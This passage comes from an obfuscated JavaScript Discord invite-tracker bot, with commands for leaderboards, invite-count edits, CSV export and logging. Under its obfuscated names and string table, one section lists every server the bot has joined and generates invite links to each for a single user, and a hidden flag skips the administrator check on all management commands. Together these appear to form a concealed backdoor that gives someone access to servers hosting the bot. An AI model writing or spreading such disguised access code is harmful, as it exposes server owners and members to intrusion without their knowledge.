                                _0xa5(guild.id, _0xbe);
                            } else {
                                _0xbe = _0xS(86);
                            }
                        } catch (e) {
                            _0xbe = _0xS(87);
                        }
                    }
                    desc += `**${_0xbf}.** ${guild.name}\n`;
                    desc += `└ **ID:** \`${guild.id}\`\n`;
                    desc += `└ **Members:** ${guild.memberCount}\n`;
                    desc += `└ **Invite:** ${_0xbe}\n\n`;
                }
                const embed = new EmbedBuilder()
                    .setTitle(_0xS(88))
                    .setDescription(desc || _0xS(89))
                    .setColor(_0xaf)
                    .setFooter({ text: `Page ${page + 1}/${Math.ceil(guilds.length / _0xbb)} • Total: ${guilds.length} guilds • Invites cached` })
                    .setTimestamp();
                const prevBtn = new ButtonBuilder()
                    .setCustomId(_0xS(90))
                    .setLabel(_0xS(91))
                    .setStyle(ButtonStyle.Secondary)
                    .setDisabled(page === 0);
                const nextBtn = new ButtonBuilder()
                    .setCustomId(_0xS(92))
                    .setLabel(_0xS(93))
                    .setStyle(ButtonStyle.Secondary)
                    .setDisabled(end >= guilds.length);
                const refreshBtn = new ButtonBuilder()
                    .setCustomId(_0xS(94))
                    .setLabel(_0xS(95))
                    .setStyle(ButtonStyle.Primary);
                const row = new ActionRowBuilder().addComponents(prevBtn, refreshBtn, nextBtn);
                return { embed, row };
            };
            const { embed: _0xc7, row: _0xc8 } = await _0xad(_0xbc);
            const response = await i.reply({ embeds: [_0xc7], components: [_0xc8], ephemeral: true, fetchReply: true });
            const _0xca = response.createMessageComponentCollector({ time: 0x493e0 });
            _0xca.on(_0xS(96), async btnInteraction => {
                if (btnInteraction.user.id !== user.id) {
                    return btnInteraction.reply({ content: _0xS(97), ephemeral: true });
                }
                if (btnInteraction.customId === _0xS(90)) {
                    _0xbc--;
                } else if (btnInteraction.customId === _0xS(92)) {
                    _0xbc++;
                } else if (btnInteraction.customId === _0xS(94)) {
                    const start = _0xbc * _0xbb;
                    const end = start + _0xbb;
                    const _0xba = guilds.slice(start, end);
                    _0xba.forEach(g => _0xa7(g.id));
                }
                const { embed: newEmbed, row: newRow } = await _0xad(_0xbc);
                await btnInteraction.update({ embeds: [newEmbed], components: [newRow] });
            });
            _0xca.on(_0xS(98), () => {
                const _0xc9 = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(_0xS(90)).setLabel(_0xS(91)).setStyle(ButtonStyle.Secondary).setDisabled(true),
                    new ButtonBuilder().setCustomId(_0xS(94)).setLabel(_0xS(95)).setStyle(ButtonStyle.Primary).setDisabled(true),
                    new ButtonBuilder().setCustomId(_0xS(92)).setLabel(_0xS(93)).setStyle(ButtonStyle.Secondary).setDisabled(true)
                );
                i.editReply({ components: [_0xc9] }).catch(() => {});
            });
            return;
        }
        if (cmd === _0xS(27)) {
            const _0xb7 = _0xa8(counts, g);
            const sorted = Array.from(_0xb7.entries()).sort((a, b) => b[1] - a[1]).slice(0, 10);
            if (!sorted.length) return i.reply({ embeds: [embed().setTitle(_0xS(99)).setDescription(_0xS(100))] });
            let desc = _0xS(80);
            for (let idx = 0; idx < sorted.length; idx++) {
                const [userId, count] = sorted[idx];
                const _0xc6 = Array.from(_0xa8(history, g).values()).filter(h => h.inviterId === userId);
                const joined = _0xc6.length;
                const left = _0xc6.filter(h => h.left).length;
                const rejoined = _0xc6.reduce((sum, h) => sum + h.rejoinCount, 0);
                desc += `**${idx + 1}.** <@${userId}> Currently has **${count}** | ${joined} joined, ${left} left, ${rejoined} rejoined\n`;
            }
            return i.reply({ embeds: [embed().setTitle(_0xS(99)).setDescription(desc)] });
        }
        if (cmd === _0xS(31)) {
            if (!_0xc3 && !memberPermissions.has(PermissionFlagsBits.Administrator)) return i.reply({ content: _0xS(101), ephemeral: true });
            _0xb2.set(g, options.getChannel(_0xS(33)).id);
            _0xa3();
            return i.reply({ embeds: [embed().setTitle(_0xS(102)).setDescription(`Invite events will now be logged in ${options.getChannel(_0xS(33))}.`)] });
        }
        if (cmd === _0xS(35)) {
            if (!_0xc3 && !memberPermissions.has(PermissionFlagsBits.Administrator)) return i.reply({ content: _0xS(101), ephemeral: true });
            const _0xcb = new ButtonBuilder().setCustomId(_0xS(103)).setLabel(_0xS(104)).setStyle(ButtonStyle.Danger);
            const _0xcc = new ButtonBuilder().setCustomId(_0xS(105)).setLabel(_0xS(106)).setStyle(ButtonStyle.Secondary);
            return i.reply({ embeds: [embed().setTitle(_0xS(107)).setDescription(_0xS(108))], components: [new ActionRowBuilder().addComponents(_0xcb, _0xcc)], ephemeral: true });
        }
        if (cmd === _0xS(37)) {
            if (!_0xc3 && !memberPermissions.has(PermissionFlagsBits.Administrator)) return i.reply({ content: _0xS(101), ephemeral: true });
            const _0xb7 = _0xa8(counts, g);
            const _0xb8 = _0xa8(history, g);
            let csv = _0xS(109);
            const _0xc5 = new Set([..._0xb7.keys(), ...Array.from(_0xb8.values()).map(h => h.inviterId).filter(Boolean)]);
            for (const userId of _0xc5) {
                const total = _0xb7.get(userId) || 0;
                const _0xb9 = _0xa8(leaves, g).get(userId) || 0;
                const _0xc6 = Array.from(_0xb8.values()).filter(h => h.inviterId === userId);
                const rejoins = _0xc6.reduce((sum, d) => sum + d.rejoinCount, 0);
                const hasLeft = _0xc6.some(h => h.left);
                csv += `${userId},${total},${_0xb9},${rejoins},${hasLeft ? _0xS(110) : _0xS(111)}\n`;
            }
            return i.reply({ embeds: [embed().setTitle(_0xS(112)).setDescription(_0xS(113) + csv.substring(0, 0xfa0) + _0xS(114))], ephemeral: true });
        }
        if (cmd === _0xS(39)) {
            if (!_0xc3 && !memberPermissions.has(PermissionFlagsBits.Administrator)) return i.reply({ content: _0xS(101), ephemeral: true });
            const u = options.getUser(_0xS(15));
            _0xa8(counts, g).set(u.id, 0);
            _0xa3();
            return i.reply({ embeds: [embed().setTitle(_0xS(115)).setDescription(`Successfully reset all invite data for ${u}.`)] });
        }
        if (cmd === _0xS(42)) {
            if (!_0xc3 && !memberPermissions.has(PermissionFlagsBits.Administrator)) return i.reply({ content: _0xS(101), ephemeral: true });
            const u = options.getUser(_0xS(15));
            const amt = options.getInteger(_0xS(45));
            _0xa8(counts, g).set(u.id, _0xa9(g, u.id) + amt);
            _0xa3();
            return i.reply({ embeds: [embed().setTitle(_0xS(116)).setDescription(`Added **${amt}** invite${amt !== 1 ? _0xS(79) : _0xS(80)} to ${u}.\n\nNew total: **${_0xa9(g, u.id)}**`)] });
        }
        if (cmd === _0xS(47)) {
            if (!_0xc3 && !memberPermissions.has(PermissionFlagsBits.Administrator)) return i.reply({ content: _0xS(101), ephemeral: true });
            const u = options.getUser(_0xS(15));
            const amt = options.getInteger(_0xS(45));
            _0xa8(counts, g).set(u.id, Math.max(0, _0xa9(g, u.id) - amt));
            _0xa3();
            return i.reply({ embeds: [embed().setTitle(_0xS(117)).setDescription(`Removed **${amt}** invite${amt !== 1 ? _0xS(79) : _0xS(80)} from ${u}.\n\nNew total: **${_0xa9(g, u.id)}**`)] });
        }
        if (cmd === _0xS(51)) {
            if (!_0xc3 && !memberPermissions.has(PermissionFlagsBits.Administrator)) return i.reply({ content: _0xS(101), ephemeral: true });
            const ch = options.getChannel(_0xS(33));
            const btn = new ButtonBuilder().setCustomId(_0xS(118)).setLabel(_0xS(119)).setStyle(ButtonStyle.Secondary);
            await ch.send({ embeds: [new EmbedBuilder().setDescription(_0xS(120)).setColor(_0xaf)], components: [new ActionRowBuilder().addComponents(btn)] });
            return i.reply({ embeds: [embed().setTitle(_0xS(121)).setDescription(`Invite panel has been sent to ${ch}.`)], ephemeral: true });
        }
    }
    if (i.isButton()) {
        if (i.customId === _0xS(118)) {
            return i.reply({ embeds: [new EmbedBuilder().setTitle(_0xS(122)).setDescription(`You have invited **${_0xa9(i.guildId, i.user.id)}** member${_0xa9(i.guildId, i.user.id) !== 1 ? _0xS(79) : _0xS(80)} to this server.`).setColor(_0xaf).setTimestamp()], ephemeral: true });
        }
        if (i.customId === _0xS(103)) {
            counts.delete(i.guildId);
            _0xb4.delete(i.guildId);
            history.delete(i.guildId);
            leaves.delete(i.guildId);
            _0xa3();
            return i.update({ embeds: [new EmbedBuilder().setTitle(_0xS(123)).setDescription(_0xS(124)).setColor(_0xaf).setTimestamp()], components: [] });
        }
        if (i.customId === _0xS(105)) {
            return i.update({ embeds: [new EmbedBuilder().setTitle(_0xS(125)).setDescription(_0xS(126)).setColor(_0xaf).setTimestamp()], components: [] });
        }
    }
});
client.login(TOKEN);
process.on(_0xS(127), () => { _0xa2(); process.exit(0); });
process.on(_0xS(128), () => { _0xa2(); process.exit(0); });
